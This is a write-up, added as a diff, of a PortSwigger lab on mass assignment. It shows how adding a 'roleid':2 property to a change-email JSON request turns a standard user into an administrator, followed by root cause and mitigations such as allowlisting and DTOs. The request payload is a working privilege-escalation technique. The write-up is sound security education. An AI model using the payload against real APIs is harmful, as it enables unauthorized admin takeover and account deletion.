@@ -1,0 +1,373 @@
+# Mass Assignment Leading to Privilege Escalation
+
+**Lab:** Mass assignment vulnerability  
+**Category:** API Security / Broken Access Control  
+**Difficulty:** Practitioner  
+**Platform:** PortSwigger Web Security Academy
+
+---
+
+# Executive Summary
+
+The application exposes an API endpoint that allows users to update their account information. Due to an insecure mass assignment implementation, the endpoint accepts additional JSON properties that were not intended to be user-controlled.
+
+By adding the hidden parameter `roleid` to the JSON request body, it was possible to change the user's role from a standard user to an administrator. This resulted in full administrative privileges and allowed unauthorized access to the administration panel, where the target user **carlos** was deleted.
+
+---
+
+# Vulnerability Classification
+
+| Attribute | Value |
+|-----------|-------|
+| Vulnerability | Mass Assignment |
+| CWE | CWE-915 - Improperly Controlled Modification of Dynamically-Determined Object Attributes |
+| OWASP Top 10 | A01:2021 – Broken Access Control |
+| OWASP API Security Top 10 | API3:2023 – Broken Object Property Level Authorization |
+| Severity | Critical |
+| CVSS v3.1 | 9.1 (Critical) |
+
+---
+
+# Target
+
+**Application:** PortSwigger Web Security Academy Lab
+
+**Affected Endpoint**
+
+```
+POST /my-account/change-email
+```
+
+---
+
+# Objective
+
+Exploit a mass assignment vulnerability to obtain administrator privileges and delete the user **carlos**.
+
+---
+
+# Methodology
+
+1. Authenticate with a standard user account.
+2. Update the account email address.
+3. Inspect the HTTP request and response.
+4. Identify the exposed `roleid` attribute.
+5. Modify the JSON request by adding a new property.
+6. Escalate privileges.
+7. Access the administration panel.
+8. Delete the target user.
+
+---
+
+# Initial Request
+
+The application allows users to update their email address using a JSON request.
+
+```http
+POST /my-account/change-email HTTP/2
+Content-Type: application/json
+
+{
+    "email":"wiener@test.com"
+}
+```
+
+---
+
+# Server Response
+
+The response unexpectedly returned the user's role identifier.
+
+```json
+{
+    "username":"wiener",
+    "email":"wiener@test.com",
+    "roleid":1
+}
+```
+
+This information disclosure suggested that the application internally used a property named `roleid`.
+
+---
+
+# Exploitation
+
+The intercepted request was sent to Burp Repeater and modified.
+
+Original request:
+
+```json
+{
+    "email":"wiener@test.com"
+}
+```
+
+Modified request:
+
+```json
+{
+    "email":"wiener@test.com",
+    "roleid":2
+}
+```
+
+The modified request was then sent to the server.
+
+---
+
+# Successful Privilege Escalation
+
+The server accepted the additional property without validation.
+
+Response:
+
+```json
+{
+    "username":"wiener",
+    "email":"wiener@test.com",
+    "roleid":2
+}
+```
+
+The user account had now been promoted to administrator.
+
+---
+
+# Administrative Access
+
+After changing the role identifier, browsing to:
+
+```http
+GET /admin HTTP/2
+```
+
+returned the administration panel.
+
+The panel displayed:
+
+```
+Users
+
+administrator
+wiener
+carlos
+```
+
+The user **carlos** was deleted, successfully completing the laboratory.
+
+---
+
+# Technical Analysis
+
+The application automatically mapped every property received in the JSON request to the server-side user object.
+
+Conceptually, the vulnerable code behaves like:
+
+```java
+User user = mapper.readValue(requestBody, User.class);
+userRepository.save(user);
+```
+
+Instead of updating only approved properties such as:
+
+- email
+
+the application also updated privileged internal attributes such as:
+
+- roleid
+
+This is a classic **Mass Assignment** vulnerability.
+
+---
+
+# Root Cause
+
+The API failed to restrict which object properties could be modified by the client.
+
+Because no allowlist of permitted fields was enforced, attackers could manipulate sensitive internal attributes simply by adding them to the JSON payload.
+
+---
+
+# Impact
+
+An attacker can:
+
+- Escalate privileges.
+- Become an administrator.
+- Access restricted functionality.
+- Modify privileged objects.
+- Delete users.
+- Potentially achieve complete application compromise.
+
+In production environments, this could result in full administrative takeover.
+
+---
+
+# Evidence
+
+## Original Request
+
+```http
+POST /my-account/change-email
+
+{
+    "email":"wiener@test.com"
+}
+```
+
+---
+
+## Modified Request
+
+```http
+POST /my-account/change-email
+
+{
+    "email":"wiener@test.com",
+    "roleid":2
+}
+```
+
+---
+
+## Successful Response
+
+```json
+{
+    "roleid":2
+}
+```
+
+---
+
+## Administrative Access
+
+```http
+GET /admin
+```
+
+Administrative interface successfully loaded.
+
+---
+
+# Root Cause Diagram
+
+```
+Client
+   │
+   ▼
+JSON Request
+
+{
+    "email":"user@test.com",
+    "roleid":2
+}
+
+   │
+   ▼
+Automatic Object Binding
+(No property filtering)
+
+   │
+   ▼
+User Object Updated
+
+email = user@test.com
+roleid = 2
+
+   │
+   ▼
+Administrator Privileges Granted
+```
+
+---
+
+# Security Recommendations
+
+## Implement Property Allowlisting
+
+Only explicitly permitted properties should be accepted from user input.
+
+Example:
+
+```
+Allowed Fields
+
+✓ email
+✓ phone
+✓ address
+
+Blocked
+
+✗ roleid
+✗ isAdmin
+✗ permissions
+✗ accountType
+```
+
+---
+
+## Use Data Transfer Objects (DTOs)
+
+Never bind incoming JSON directly to domain models.
+
+Instead:
+
+```
+JSON
+   │
+   ▼
+DTO
+
+email
+
+   │
+   ▼
+Validation
+
+   │
+   ▼
+Business Logic
+
+   │
+   ▼
+User Entity
+```
+
+---
+
+## Server-Side Authorization
+
+Authorization-related properties should never be accepted from client input.
+
+Role assignments must only be performed by trusted administrative functionality.
+
+---
+
+## Validate Unexpected Parameters
+
+Reject any request containing unknown or unauthorized JSON properties.
+
+---
+
+# References
+
+- OWASP Top 10 2021 – A01: Broken Access Control
+- OWASP API Security Top 10 – API3:2023 Broken Object Property Level Authorization
+- CWE-915 – Improperly Controlled Modification of Dynamically-Determined Object Attributes
+- PortSwigger Web Security Academy – Mass Assignment
+
+---
+
+# Conclusion
+
+The application was vulnerable to **Mass Assignment**, allowing arbitrary modification of internal object properties.
+
+By adding the hidden `roleid` attribute to the JSON request, it was possible to escalate privileges from a normal user to an administrator without exploiting authentication or guessing credentials.
+
+This vulnerability highlights the importance of restricting which properties may be modified by clients and avoiding automatic binding between user-controlled input and sensitive server-side objects.
+
+---
+
+**Lab Status:** ✅ Solved
+```
